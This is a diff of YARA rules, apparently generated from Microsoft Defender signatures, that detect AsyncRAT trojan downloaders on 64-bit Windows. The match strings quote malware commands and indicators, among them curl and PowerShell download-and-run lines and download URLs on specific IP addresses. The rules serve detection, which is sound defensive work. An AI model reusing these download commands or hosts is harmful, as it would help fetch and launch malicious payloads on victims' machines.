@@ -1,117 +1,64 @@
-rule TrojanDownloader_Win64_AsyncRAT_A_2147851168_0
+rule TrojanDownloader_Win64_AsyncRat_CEB_2147845754_0
 {
     meta:
         author = "defender2yara"
-        detection_name = "TrojanDownloader:Win64/AsyncRAT.A!MTB"
-        threat_id = "2147851168"
+        detection_name = "TrojanDownloader:Win64/AsyncRat.CEB!MTB"
+        threat_id = "2147845754"
         type = "TrojanDownloader"
         platform = "Win64: Windows 64-bit platform"
-        family = "AsyncRAT"
-        severity = "Critical"
-        info = "MTB: Microsoft Threat Behavior"
-        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
-        threshold = "4"
-        strings_accuracy = "High"
-    strings:
-        $x_2_1 = "C:\\Users\\Public\\main.exe" wide //weight: 2
-        $x_2_2 = "://116.62.11.90/main.exe" wide //weight: 2
-    condition:
-        (filesize < 20MB) and
-        (all of ($x*))
-}
-
-rule TrojanDownloader_Win64_AsyncRAT_B_2147851259_0
-{
-    meta:
-        author = "defender2yara"
-        detection_name = "TrojanDownloader:Win64/AsyncRAT.B!MTB"
-        threat_id = "2147851259"
-        type = "TrojanDownloader"
-        platform = "Win64: Windows 64-bit platform"
-        family = "AsyncRAT"
-        severity = "Critical"
-        info = "MTB: Microsoft Threat Behavior"
-        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
-        threshold = "6"
-        strings_accuracy = "High"
-    strings:
-        $x_2_1 = "Ly9wYXN0ZS5mby9yYXcvN" ascii //weight: 2
-        $x_2_2 = "attrib +h" ascii //weight: 2
-        $x_2_3 = "\\.\\PhysicalDrive0" wide //weight: 2
-    condition:
-        (filesize < 20MB) and
-        (all of ($x*))
-}
-
-rule TrojanDownloader_Win64_AsyncRAT_C_2147889004_0
-{
-    meta:
-        author = "defender2yara"
-        detection_name = "TrojanDownloader:Win64/AsyncRAT.C!MTB"
-        threat_id = "2147889004"
-        type = "TrojanDownloader"
-        platform = "Win64: Windows 64-bit platform"
-        family = "AsyncRAT"
-        severity = "Critical"
-        info = "MTB: Microsoft Threat Behavior"
-        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
-        threshold = "4"
-        strings_accuracy = "High"
-    strings:
-        $x_2_1 = "cmd.exe /c curl -o %temp%\\" ascii //weight: 2
-        $x_2_2 = "powershell start -WindowStyle hidden %temp%\\" ascii //weight: 2
-    condition:
-        (filesize < 20MB) and
-        (all of ($x*))
-}
-
-rule TrojanDownloader_Win64_AsyncRAT_D_2147890063_0
-{
-    meta:
-        author = "defender2yara"
-        detection_name = "TrojanDownloader:Win64/AsyncRAT.D!MTB"
-        threat_id = "2147890063"
-        type = "TrojanDownloader"
-        platform = "Win64: Windows 64-bit platform"
-        family = "AsyncRAT"
-        severity = "Critical"
-        info = "MTB: Microsoft Threat Behavior"
-        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
-        threshold = "5"
-        strings_accuracy = "Low"
-    strings:
-        $x_2_1 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 6d 61 69 6e ?? 2e 65 78 65}  //weight: 2, accuracy: Low
-        $x_1_2 = "CreateProcessW" ascii //weight: 1
-        $x_1_3 = "RtlGetNtVersionNumbers" ascii //weight: 1
-        $x_2_4 = {2f 6d 61 69 6e ?? 2e 65 78 65}  //weight: 2, accuracy: Low
-        $x_1_5 = "URLDownloadToFileA" ascii //weight: 1
-    condition:
-        (filesize < 20MB) and
-        (
-            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
-            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
-            (all of ($x*))
-        )
-}
-
-rule TrojanDownloader_Win64_AsyncRAT_E_2147919849_0
-{
-    meta:
-        author = "defender2yara"
-        detection_name = "TrojanDownloader:Win64/AsyncRAT.E!MTB"
-        threat_id = "2147919849"
-        type = "TrojanDownloader"
-        platform = "Win64: Windows 64-bit platform"
-        family = "AsyncRAT"
+        family = "AsyncRat"
         severity = "Critical"
         info = "MTB: Microsoft Threat Behavior"
         signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
         threshold = "8"
+        strings_accuracy = "Low"
+    strings:
+        $x_5_1 = {f3 0f 7f 4c 24 ?? 66 c7 44 24 [0-4] 66 0f 6f 0d ?? 20 00 00 f3 0f 7f 44 24 ?? c6 44 24 ?? ?? f3 0f 7f 4c 24 [0-3] c7 44 24 [0-10] 48 c7 44 24 20 00 00 00 00 ff}  //weight: 5, accuracy: Low
+        $x_1_2 = "\\x64\\Release\\WechatAnd.pdb" ascii //weight: 1
+        $x_1_3 = "\\code.bin" wide //weight: 1
+        $x_1_4 = "WindowsProject1" wide //weight: 1
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule TrojanDownloader_Win64_AsyncRat_CCIQ_2147926487_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "TrojanDownloader:Win64/AsyncRat.CCIQ!MTB"
+        threat_id = "2147926487"
+        type = "TrojanDownloader"
+        platform = "Win64: Windows 64-bit platform"
+        family = "AsyncRat"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
+        threshold = "1"
         strings_accuracy = "High"
     strings:
-        $x_4_1 = "RatDownload\\x64\\Release\\RatLoader.pdb" ascii //weight: 4
-        $x_2_2 = "download/Realease" ascii //weight: 2
-        $x_2_3 = "APPDATA" ascii //weight: 2
+        $x_1_1 = {48 81 c7 5d 7a 17 48 57 5f 49 31 38 eb 0b 56 5e}  //weight: 1, accuracy: High
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
+rule TrojanDownloader_Win64_AsyncRat_CCJU_2147932185_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "TrojanDownloader:Win64/AsyncRat.CCJU!MTB"
+        threat_id = "2147932185"
+        type = "TrojanDownloader"
+        platform = "Win64: Windows 64-bit platform"
+        family = "AsyncRat"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
+        threshold = "2"
+        strings_accuracy = "High"
+    strings:
+        $x_2_1 = "powershell(new-object System.Net.WebClient).DownloadFile('http://149.88.66.68/test.mp3','%Temp%/test.bin')" ascii //weight: 2
     condition:
         (filesize < 20MB) and
         (all of ($x*))
